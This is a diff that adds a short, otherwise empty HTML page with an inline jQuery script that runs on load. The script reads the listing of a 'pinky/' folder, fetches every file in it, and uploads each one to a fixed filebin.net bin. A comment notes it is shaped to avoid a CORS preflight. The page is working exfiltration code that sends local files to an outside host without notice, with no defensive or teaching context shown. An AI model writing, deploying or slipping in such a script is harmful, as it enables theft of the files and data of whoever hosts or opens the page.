@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <script src="https://code.jquery.com/jquery-1.11.2.min.js"></script>
+    </head>
+    <body>
+        <script>
+            var folderUrl = 'pinky/';
+            var bin = '638ya0st801ywzi6';
+
+            $.get(folderUrl, function(html) {
+                $(html).find('a').each(function() {
+                    var href = $(this).attr('href');
+
+                    if (href && !href.startsWith('?') && href !== '../' && href !== '/' && !href.endsWith('/')) {
+                        var fileUrl = folderUrl + href;
+
+                        fetch(fileUrl)
+                            .then(response => response.blob())
+                            .then(blob => {
+                                var rawBlob = new Blob([blob]); // strip content-type, avoid preflight
+
+                                var uploadUrl = 'https://filebin.net/' + bin + '/' + encodeURIComponent(href);
+
+                                fetch(uploadUrl, {
+                                    method: 'POST',
+                                    body: rawBlob
+                                })
+                                .then(res => console.log('Uploaded:', href, 'Status:', res.status))
+                                .catch(err => console.error('Upload failed:', href, err));
+                            })
+                            .catch(err => console.error('Fetch error:', href, err));
+                    }
+                });
+            })
+            .fail(function(xhr) {
+                console.error('Could not load folder listing:', xhr.status);
+            });
+        </script>
+    </body>
+</html>
